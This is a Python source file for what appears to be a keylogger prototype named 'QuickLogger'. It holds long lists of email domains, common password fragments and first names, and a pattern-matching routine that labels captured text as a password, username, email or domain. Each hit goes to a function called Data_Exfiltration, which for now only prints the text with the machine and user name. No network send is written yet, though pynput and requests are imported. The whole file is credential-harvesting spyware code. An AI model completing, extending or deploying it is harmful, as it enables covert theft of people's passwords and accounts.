from pynput import keyboard
import requests
import datetime

import re, os
import threading

Login_forms = {
"Contacted-domains" : [".com", ".org", ".gov", ".tv", ".net", ".edu", ".io", 
                       ".dev", ".app", ".xyz", ".online", ".tech", ".club", 
                       ".shop", ".store", ".cloud", ".host", ".site", ".web", ".zone", 
                       ".network", ".global", ".world", ".life", ".love", 
                       ".work", ".live", ".media", ".digital", ".solutions", 
                       ".services", ".consulting", ".academy", ".agency", 
                       ".associates", ".capital", ".care", ".center", ".company", 
                       ".consulting", ".design", ".enterprises", ".expert", 
                       ".foundation", ".group"],

    "Email" : ["@gmail.com", "@outlook.com", "@yahoo.com", "@hotmail.com", "@aol.com", "@icloud.com", 
               "@mail.com", "@protonmail.com", "@zoho.com", "@yandex.com", "@gmx.com", "@tutanota.com", 
               "@fastmail.com", "@hushmail.com", "@mail.ru", "@inbox.com", "@live.com", "@msn.com", "@me.com", "@mac.com", 
               "@googlemail.com", "@facebook.com", "@twitter.com", "@instagram.com", "@linkedin.com", "@amazon.com", "@apple.com", 
               "@microsoft.com", "@github.com", "@reddit.com", "@discord.com", "@slack.com", "@spotify.com", "@netflix.com", "@dropbox.com", 
               "@zoom.us", "@skype.com", "@telegram.org", "@whatsapp.com", "@signal.org", "@snapchat.com", "@tiktok.com", "@twitch.tv", "@paypal.com", "@ebay.com", 
               "@aliexpress.com", "@shopify.com", "@wordpress.com", "@blogger.com", "@tumblr.com", "@pinterest.com", "@quora.com", "@medium.com", "@substack.com", "@notion.so", 
               "@airbnb.com", "@uber.com", "@lyft.com", "@doordash.com", "@venmo.com", "@cash.app", "@chase.com", "@wellsfargo.com", "@bankofamerica.com", "@citi.com", 
               "@capitalone.com", "@amex.com", "@discover.com", "@usaa.com", "@navyfederal.org", "@penfed.org", "@caltech.edu", "@mit.edu", "@stanford.edu", "@harvard.edu", 
               "@yale.edu", "@princeton.edu", "@columbia.edu", "@upenn.edu", "@cornell.edu", "@brown.edu", "@uchicago.edu", "@berkeley.edu", "@ucla.edu", "@nyu.edu", "@duke.edu", 
               "@northwestern.edu", "@umich.edu", "@gatech.edu", "@cmu.edu", "@uiuc.edu", "@washington.edu", "@psu.edu", "@osu.edu", "@utexas.edu", "@tamu.edu", 
               "@vt.edu", "@ncsu.edu", "@purdue.edu", "@indiana.edu", "@msu.edu", "@rpi.edu", "@stevens.edu", "@wpi.edu"],

    "Passwords" : {"Possible" : ["Dog", "Cat", "River", "ILove", "Hi", "Hey", "Hello", "Sup", "Dev",
                                 "male", "female", "he", "her", "the", "quick", "flow", "animal", "mie", 
                                 "jan", "feb", "ma", "world", "sun", "moon", "star", "sky", "blue", "red", 
                                 "green", "yellow", "purple", "orange", "pink", "black", "white", "grey", 
                                 "gold", "silver", "bronze", "copper", "iron", "steel", "stone", "water", 
                                 "fire", "wind", "earth", "rain", "snow", "ice", "cloud", "thunder", "lightning", 
                                 "ocean", "sea", "lake", "river", "forest", "mountain", "hill", "valley", "desert", 
                                 "jungle", "tundra", "plain", "island", "beach", "cave", "cliff", "rock", "sand", 
                                 "dust", "ash", "storm", "tornado", "hurricane", "typhoon", "cyclone", "blizzard", 
                                 "freeze", "melt", "burn", "crush", "smash", "break", "build", "create", "destroy", 
                                 "transform", "evolve", "grow", "shrink", "expand", "collapse", "erupt", "flow", 
                                 "surge", "spark", "glow", "shine", "twinkle", "flicker", "flash", "blaze", "ember", 
                                 "phoenix", "dragon", "serpent", "wolf", "fox", "bear", "lion", "tiger", "eagle", 
                                 "hawk", "falcon", "raven", "crow", "dove", "swan", "whale", "dolphin", "shark", 
                                 "salmon", "trout", "bass", "cod", "tuna", "marlin", "swordfish", "squid", "octopus", 
                                 "crab", "lobster", "shrimp", "snail", "slug", "worm", "beetle", "ant", "bee", "wasp", 
                                 "hornet", "fly", "mosquito", "butterfly", "moth", "spider", "scorpion", "centipede", 
                                 "millipede", "roach", "cricket", "grasshopper", "mantis", "dragonfly", "damselfly", 
                                 "firefly", "glowworm", "lightningbug", "Authenticate", "Authorize", "Validate", 
                                 "Session", "Cookie", "Token", "Key", "Secret", "Cipher", "Encrypt", "Decrypt", "Hash",
                                  "Qwerty", "Qwerty123", "Letmein", "Letmein123", "Welcome", "Welcome123", "Hello", 
                                  "Hello123", "Hi", "Hi123", "Hey", "Hey123", "Sup", "Sup123", "Test", "Test123", 
                                  "Demo", "Demo123", "Sample", "Sample123", "Example", "Example123", "Temporary", 
                                  "Temporary123", "Default", "Default123", "ChangeMe", "ChangeMe123", "MustChange", 
                                  "MustChange123", "NewPassword", "NewPassword123", "OldPassword", "OldPassword123", 
                                  "Pass123", "Passw0rd", "Pa55w0rd", "P@ssw0rd", "P@55w0rd", "Salt", "Secure"],

                    "Overused" : ["Password", "Pass", "Log", "MyAccount", "Google", "Outlook", "Email", "Stuff", 
                                  "PrivateAccount", "Log", "Account", "Acc", "Private", "Compromised", "Admin", 
                                  "Administrator", "Root", "Sys", "System", "User", "Guest", "Login", "Signin", 
                                  "Signup", "Register", "Create", "Change", "Reset", "Forgot", "Recover", "Verify"],

                   "Months" : ["January", "February", "March", "April", "May", "June", "July", 
                               "August", "September", "October", "November", "December", "Jan", "Feb", 
                               "Mar", "Apr", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]},

    "Usernames" : ["Liam", "Noah", "Oliver", "Theodore", "Henry", "Pete", "Jack", "Alex", "Juliet", "Marcus", 
                    "James", "Elijah", "Mateo", "Lucas", "William", "John", "Maria", "Denis", 
                    "Olivia", "Charlotte", "Emma", "Amelia", "Sophia", "Dave", "David", 
                    "Mia", "Isabella", "Evelyn", "Eliana", "Harper", "Nikodem", "Jake", 
                    "Antoni", "Leon", "Jan", "Aleksander", "Franciszek", "Ignacy",
                    "Zofia", "Zuzanna", "Maja", "Hanna", "Laura", "Santiago", "Emiliano", "Alejandro", "Francisco", 
                    "Diego", "Sofía", "Valentina", "Luna", "Aurora", "Xochitl", "Vicente", "Tomás", "João", 
                    "Duarte", "Afonso", "Alice", "Benedita", "Matilde", "Mateusz", "Kacper", "Jakub", "Szymon", 
                    "Wojciech", "Mikołaj", "Adam", "Stanisław", "Tomasz", "Paweł", "Piotr", "Krzysztof", "Michał", 
                    "Marcin", "Andrzej", "Józef", "Tadeusz", "Roman", "Władysław", "Eugeniusz", "Kazimierz", 
                    "Zbigniew", "Ryszard", "Stefan", "Bogdan", "Marek", "Jerzy", "Radosław", "Mirosław", "Sławomir", 
                    "Grzegorz", "Wiesław", "Janusz", "Dariusz", "Robert", "Łukasz", "Kamil", "Artur", "Daniel", 
                    "Przemysław", "Mariusz", "Sebastian", "Damian", "Patryk", "Dominik", "Igor", "Oskar", "Wiktor", 
                    "Filip", "Ksawery", "Konstanty", "Gustaw", "Julian", "Antonin", "Borys", "Cezary", "Edmund", 
                    "Fabian", "Gerald", "Hubert", "Iwo", "Jacek", "Kornel", "Leszek", "Maurycy", "Norbert", "Olgierd", 
                    "Roch", "Tymon", "Witold", "Zygmunt", "Błażej", "Cyprian", "Dobromir", "Eliasz", "Florian", 
                    "Gabriel", "Henryk", "Izaak", "Jeremiasz", "Klemens", "Laurenty", "Maksymilian", "Napoleon", 
                    "Odon", "Pankracy", "Radomir", "Sergiusz", "Tobiasz", "Urban", "Walerian", "Zybert", "Balbina", 
                    "Celina", "Dobrawa", "Eleonora", "Felicja", "Genowefa", "Halina", "Ida", "Jadwiga", "Karolina", 
                    "Ludwika", "Monika", "Natalia", "Olga", "Patrycja", "Róża", "Sabina", "Teresa", "Urszula", 
                    "Weronika", "Zygmunta", "Anastazja", "Bożena", "Cecylia", "Danuta", "Elżbieta", "Fryderyka", 
                    "Grażyna", "Helena", "Irena", "Jolanta", "Krystyna", "Leokadia", "Marcelina", "Nadzieja", 
                    "Oktawia", "Pelagia", "Regina", "Stefania", "Tekla", "Walentyna", "Zenobia", "Bogumiła", 
                    "Czesława", "Dioniza", "Edyta", "Felicjana", "Gertruda", "Honorata", "Ingeborga", "Judyta", 
                    "Klaudia", "Liberta", "Mirosława", "Nikola", "Otylia", "Petronela", "Roksana", "Salomea", 
                    "Tamara", "Władysława", "Zyta", "Abigail", "Adele", "Agnes", "Alexandra", "Alison", "Amber", 
                    "Amy", "Andrea", "Angela", "Anna", "Anne", "Annette", "April", "Ashley", "Audrey", "Avery", 
                    "Beatrice", "Bethany", "Beverly", "Bianca", "Bonnie", "Brandy", "Brenda", "Brianna", "Brittany", 
                    "Brooke", "Caitlin", "Cameron", "Candace", "Carla", "Carmen", "Carol", "Caroline", "Cassandra", 
                    "Catherine", "Cathy", "Charlene", "Cheryl", "Christina", "Christine", "Cindy", "Claire", "Clara", 
                    "Claudia", "Crystal", "Cynthia", "Daisy", "Dana", "Danielle", "Darlene", "Dawn", "Deanna", 
                    "Debbie", "Deborah", "Debra", "Denise", "Desiree", "Diana", "Diane", "Dolores", "Donna", "Dora", 
                    "Doris", "Dorothy", "Eileen", "Elaine", "Eleanor", "Elena", "Elisha", "Elizabeth", "Ella", 
                    "Ellen", "Emily", "Emma", "Erica", "Erika", "Erin", "Ethel", "Eva", "Eve", "Evelyn", "Faith", 
                    "Faye", "Felicia", "Flora", "Florence", "Frances", "Gabriella", "Gail", "Geraldine", "Gina", 
                    "Gloria", "Grace", "Gretchen", "Gwendolyn", "Hannah", "Hazel", "Heather", "Heidi", "Helen", 
                    "Holly", "Hope", "Irene", "Iris", "Isabel", "Jacqueline", "Jade", "Jamie", "Jan", "Janet", 
                    "Janice", "Jasmine", "Jean", "Jeanne", "Jenna", "Jennifer", "Jessica", "Jill", "Jo", "Joan", 
                    "Joanna", "Jocelyn", "Jodi", "Joy", "Joyce", "Judith", "Judy", "Julia", "Julie", "June", 
                    "Kaitlyn", "Karen", "Katherine", "Kathleen", "Kathryn", "Kathy", "Katie", "Kay", "Kayla", 
                    "Kellie", "Kelly", "Kim", "Kimberly", "Kristen", "Kristin", "Kristina", "Kristine", "Krystal", 
                    "Kyla", "Kyra", "Lacey", "Lara", "Lauren", "Laurie", "Leah", "Lee", "Leigh", "Leslie", "Lila", 
                    "Lilian", "Lindsay", "Lisa", "Loraine", "Loretta", "Lori", "Louise", "Lucille", "Lucy", "Lydia", 
                    "Lynne", "Mackenzie", "Madeline", "Madison", "Mallory", "Mandy", "Mara", "Marcia", "Margaret", 
                    "Margie", "Mariah", "Marie", "Marilyn", "Marion", "Marjorie", "Marlene", "Marsha", "Martha", 
                    "Mary", "Maureen", "Megan", "Melanie", "Melinda", "Melissa", "Melody", "Mercedes", "Meredith", 
                    "Michele", "Michelle", "Mildred", "Mindy", "Miranda", "Miriam", "Misty", "Molly", "Monica", 
                    "Nadine", "Nancy", "Naomi", "Natalie", "Natasha", "Nichole", "Nicole", "Nina", "Nora", "Norma", 
                    "Olive", "Olivia", "Pamela", "Pat", "Patricia", "Patsy", "Paula", "Pauline", "Pearl", "Peggy", 
                    "Penny", "Phyllis", "Rachel", "Rebecca", "Regina", "Renee", "Rhonda", "Rita", "Robin", "Rosa", 
                    "Rose", "Rosemary", "Ruby", "Ruth", "Sally", "Samantha", "Sandra", "Sandy", "Sarah", "Savannah", 
                    "Shannon", "Sharon", "Sheila", "Shelby", "Shelly", "Sherri", "Sherry", "Shirley", "Sierra", 
                    "Sonia", "Stacey", "Stacy", "Stephanie", "Sue", "Summer", "Susan", "Suzanne", "Sydney", "Sylvia", 
                    "Tamara", "Tammy", "Tara", "Taryn", "Taylor", "Teresa", "Terri", "Tiffany", "Tina", "Toni", 
                    "Tonya", "Tracey", "Tracy", "Trisha", "Tricia", "Trista", "Valerie", "Vanessa", "Vera", "Vicki", 
                    "Vickie", "Victoria", "Viola", "Virginia", "Vivian", "Wanda", "Wendy", "Whitney", "Yvonne", "Zoe"]
}

current_date = datetime.datetime.now().strftime("%d-%h-%m")
current_time = datetime.datetime.now().strftime("%H:%M")
combined_dt = f"{current_date}/{current_time}"

def Data_Exfiltration(Content):
    pass

def Data_Exfiltration(Form, Requested_Content):
    print(f"[{Form}] {datetime.datetime.now().strftime("%d-%h-%m")}/{datetime.datetime.now().strftime("%H:%M")}, {os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')} - {Requested_Content}")

def Pattern_Matching(Content):

    Common_digits = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
                     123, 321, 101, 404, 400, 000, 111, 222, 333, 16,
                     1995, 1996, 2004, 444, 555, 666, 777, 888, 999, 
                     1993, 1994, 1997, 1998, 1999, 2000, 2001, 2002, 
                     2003, 2005, 2006, 2007, 2008, 2009, 2013, 2014,
                     2016, 2015, 2020, 2021, 2022, 2023, 2024, 2025]

    digits_pattern = '|'.join(map(str, Common_digits))
    names_pattern = '|'.join(re.escape(name) for name in Login_forms['Passwords']["Possible"])
    email_pattern = '|'.join(re.escape(email) for email in Login_forms['Email'])
    domains_pattern = '|'.join(re.escape(email) for email in Login_forms['Contacted-domains'])
    overused_pattern = '|'.join(re.escape(common) for common in Login_forms['Passwords']["Overused"])
    months_pattern = '|'.join(re.escape(month) for month in Login_forms['Passwords']["Months"])
    usernames_pattern = '|'.join(re.escape(user) for user in Login_forms['Usernames'])

    if (
        (re.search(rf"({names_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({months_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({usernames_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({overused_pattern.lower()})", Content.lower()))
    ):
        Data_Exfiltration("password", Content)

    elif re.search(rf"({usernames_pattern.lower()})", Content.lower(), re.IGNORECASE):
        Data_Exfiltration("username", Content)

    if re.search(rf"({email_pattern.lower()}$)", Content.lower(), re.IGNORECASE):
        Data_Exfiltration("email", Content)

    elif re.search(rf"({domains_pattern.lower()}$)", Content.lower(), re.IGNORECASE):
        Data_Exfiltration("domain", Content)

while True:
    Form = input("QuickLogger pattern matching> ")
    if Form:
        Pattern_Matching(Form)